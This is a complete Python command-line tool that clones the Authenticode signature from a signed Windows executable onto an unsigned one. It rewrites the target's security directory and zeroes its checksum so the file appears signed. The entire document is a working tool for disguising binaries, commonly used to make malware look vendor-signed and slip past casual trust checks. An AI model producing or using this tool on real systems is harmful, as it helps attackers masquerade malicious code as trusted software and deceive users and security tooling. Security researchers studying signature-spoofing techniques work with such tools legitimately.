"""Clone an Authenticode signature from one PE to another."""

import struct
from pathlib import Path


def clone_signature(signed_pe: str | Path, unsigned_pe: str | Path) -> bool:
    """Append the Authenticode signature from signed_pe onto unsigned_pe (in-place)."""
    with open(signed_pe, "rb") as f:
        src = f.read()

    e_lfanew = struct.unpack_from("<I", src, 0x3C)[0]
    magic = struct.unpack_from("<H", src, e_lfanew + 0x18)[0]
    cert_dir_off = e_lfanew + 0x18 + (0x90 if magic == 0x20B else 0x80)
    cert_rva, cert_size = struct.unpack_from("<II", src, cert_dir_off)

    if cert_rva == 0 or cert_size == 0:
        return False

    cert_data = src[cert_rva:cert_rva + cert_size]

    with open(unsigned_pe, "r+b") as f:
        data = f.read()
        pe_size = len(data)
        aligned = (pe_size + 7) & ~7

        t_lfanew = struct.unpack_from("<I", data, 0x3C)[0]
        t_magic = struct.unpack_from("<H", data, t_lfanew + 0x18)[0]
        t_cert_off = t_lfanew + 0x18 + (0x90 if t_magic == 0x20B else 0x80)

        f.seek(0, 2)
        f.write(b"\x00" * (aligned - pe_size))
        f.write(cert_data)

        f.seek(t_cert_off)
        f.write(struct.pack("<II", aligned, cert_size))

        # Zero out checksum
        f.seek(t_lfanew + 0x18 + 0x40)
        f.write(struct.pack("<I", 0))

    return True


if __name__ == "__main__":
    import sys
    if len(sys.argv) != 3:
        print("Usage: sigclone.py <signed_source> <unsigned_target>")
        sys.exit(1)
    if clone_signature(sys.argv[1], sys.argv[2]):
        print(f"[+] Signature cloned from {sys.argv[1]} to {sys.argv[2]}")
    else:
        print("[-] Source PE has no signature")
        sys.exit(1)
